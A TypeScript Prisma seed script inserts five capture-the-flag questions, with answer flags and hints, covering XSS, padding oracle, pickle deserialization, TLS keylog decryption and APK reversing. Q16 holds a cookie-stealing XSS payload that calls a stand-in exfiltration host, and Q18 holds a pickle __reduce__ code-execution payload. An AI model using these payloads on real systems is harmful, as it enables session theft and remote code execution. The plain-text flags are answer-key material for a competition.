import { PrismaClient } from "@prisma/client";

const prisma = new PrismaClient();

const additionalQuestions = [
  {
    order: 16,
    title: "Q16 — Cross-Site Scripting (XSS) Vault Token Leak",
    description: "An unescaped search parameter on the internal banking terminal allows reflected script execution: `q=<script>fetch('http://c2.internal/exfil?c='+document.cookie)</script>`. Extract the administrator's vault session token flag.",
    answer: "CC{stored_xss_vault_session_token_leaked}",
    points: 200,
    difficulty: "HARD",
    category: "Web Security",
    hints: [
      { order: 1, title: "Hint 1: DOM Inspection", content: "Inspect how the query parameter is reflected into the DOM without HTML entity encoding.", cost: 40 },
      { order: 2, title: "Hint 2: Cookie Exfiltration", content: "Look at the simulated network log in the terminal debugger to see the exfiltrated document.cookie.", cost: 80 }
    ]
  },
  {
    order: 17,
    title: "Q17 — Padding Oracle Attack on CBC Ciphertext",
    description: "A proprietary vault access controller uses AES-128-CBC with PKCS#7 padding. The oracle server responds with `200 OK` on valid padding and `500 Server Error` on invalid padding. Decrypting the target ciphertext byte-by-byte reveals the vault master key flag.",
    answer: "CC{padding_oracle_cbc_byte_recovered}",
    points: 250,
    difficulty: "HARD",
    category: "Cryptography",
    hints: [
      { order: 1, title: "Hint 1: CBC Padding", content: "PKCS#7 padding adds N bytes of value N to align to the 16-byte block boundary.", cost: 50 },
      { order: 2, title: "Hint 2: Oracle Manipulation", content: "Modifying byte C_{i-1}[15] and observing the padding error allows solving intermediate state I_i[15].", cost: 90 }
    ]
  },
  {
    order: 18,
    title: "Q18 — Insecure Deserialization RCE Vault Breach",
    description: "The backup vault synchronizer accepts serialized Python objects via base64 encoding over a raw TCP socket. Supplying a crafted `pickle.dumps` payload triggering `os.system('cat /vault/secret.flag')` outputs the secret flag.",
    answer: "CC{pickle_deserialization_rce_vault_breach}",
    points: 200,
    difficulty: "HARD",
    category: "Web Security",
    hints: [
      { order: 1, title: "Hint 1: Python Pickle", content: "Python's `pickle` module allows arbitrary code execution via the `__reduce__` callable magic method.", cost: 40 },
      { order: 2, title: "Hint 2: Payload Crafting", content: "Construct a class with `def __reduce__(self): return (os.system, ('cat /vault/secret.flag',))` and base64-encode.", cost: 80 }
    ]
  },
  {
    order: 19,
    title: "Q19 — PCAP TLS Master Secret Decryption",
    description: "A network capture file `vault_traffic.pcapng` intercepted an encrypted HTTPS data transfer. The server's `SSLKEYLOGFILE` was dumped from memory containing the Pre-Master Secret. Decrypt the TLS stream to recover the internal transmission flag.",
    answer: "CC{tls_session_pcap_decrypted_with_keylog}",
    points: 150,
    difficulty: "MEDIUM",
    category: "Network Security",
    hints: [
      { order: 1, title: "Hint 1: SSL Keylog Format", content: "Lines begin with `CLIENT_RANDOM <random_hex> <master_key_hex>`.", cost: 30 },
      { order: 2, title: "Hint 2: Stream Decryption", content: "Use Wireshark or tshark with `-o tls.keylog_file:keys.log` to view decrypted HTTP payload.", cost: 60 }
    ]
  },
  {
    order: 20,
    title: "Q20 — Android APK Hardcoded Key Extraction",
    description: "Decompiling the mobile security authenticator app `VaultAuth.apk` using JADX reveals an obfuscated string array in `com.cipherchase.vault.CryptoUtil` reconstructed via bitwise XOR. What is the hardcoded authorization flag?",
    answer: "CC{apk_jadx_hardcoded_secret_decompiled}",
    points: 150,
    difficulty: "MEDIUM",
    category: "Reverse Engineering",
    hints: [
      { order: 1, title: "Hint 1: JADX Decompiler", content: "Decompile classes.dex and search for references to `Cipher` or `SecretKeySpec`.", cost: 30 },
      { order: 2, title: "Hint 2: XOR Decryptor", content: "Look at the static initializer `static { ... }` where byte arrays are XORed with 0x5A.", cost: 60 }
    ]
  }
];

async function main() {
  console.log("Seeding / Verifying Round 1 has exactly 20 questions...");

  const round1 = await prisma.round.findFirst({
    where: { number: 1 },
  });

  if (!round1) {
    throw new Error("Round 1 not found!");
  }

  // Check existing questions in Round 1
  const existingQuestions = await prisma.question.findMany({
    where: { roundId: round1.id },
    orderBy: { order: "asc" },
  });

  console.log(`Current questions in Round 1: ${existingQuestions.length}`);

  // Mark all existing questions as core and released
  await prisma.question.updateMany({
    where: { roundId: round1.id },
    data: { isCore: true, isReleased: true, isActive: true },
  });

  for (const q of additionalQuestions) {
    const existing = existingQuestions.find((eq) => eq.order === q.order);
    if (!existing) {
      console.log(`Creating Question ${q.order}: ${q.title}...`);
      const { hints, ...qData } = q;
      await prisma.question.create({
        data: {
          ...qData,
          roundId: round1.id,
          isCore: true,
          isReleased: true,
          isActive: true,
          answerMode: "TRIMMED",
          hints: {
            create: hints.map((h) => ({
              title: h.title,
              content: h.content,
              cost: h.cost,
              order: h.order,
            })),
          },
        },
      });
    } else {
      console.log(`Question ${q.order} already exists.`);
    }
  }

  const finalQuestions = await prisma.question.findMany({
    where: { roundId: round1.id },
    select: { order: true, title: true, isCore: true, isReleased: true },
    orderBy: { order: "asc" },
  });

  console.log(`Total questions in Round 1: ${finalQuestions.length}`);
  finalQuestions.forEach((q) => {
    console.log(`  Q${q.order.toString().padStart(2, "0")}: ${q.title}`);
  });
}

main()
  .catch((e) => {
    console.error(e);
    process.exit(1);
  })
  .finally(async () => {
    await prisma.$disconnect();
  });
